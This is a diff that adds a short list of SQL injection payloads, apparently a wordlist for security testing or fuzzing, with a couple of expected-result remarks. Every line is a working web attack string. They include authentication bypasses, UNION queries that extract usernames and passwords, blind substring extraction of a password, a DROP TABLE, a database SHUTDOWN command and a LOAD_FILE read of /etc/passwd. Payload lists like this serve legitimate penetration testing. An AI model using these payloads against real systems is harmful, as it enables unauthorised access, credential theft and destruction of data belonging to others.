@@ -1,0 +1,17 @@
+' OR '1'='1
+" OR ""="
+admin'--
+' OR 1=1--
+' OR 'a'='a'--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT username,password,NULL FROM users--
+' UNION ALL SELECT database(),user(),version()--
+' AND 1=CONVERT(int,@@version)--
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+' AND (SELECT COUNT(*) FROM sysobjects)>0-- (MSSQL)
+'; DROP TABLE customer--  
+'; SHUTDOWN WITH NOWAIT-- (SQL Server)  
+' OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL-- (MySQL)
+' AND '1'='2 (Should return empty results)
+' OR ''=' (Should not bypass authentication)
+' /* Random Comment */ --
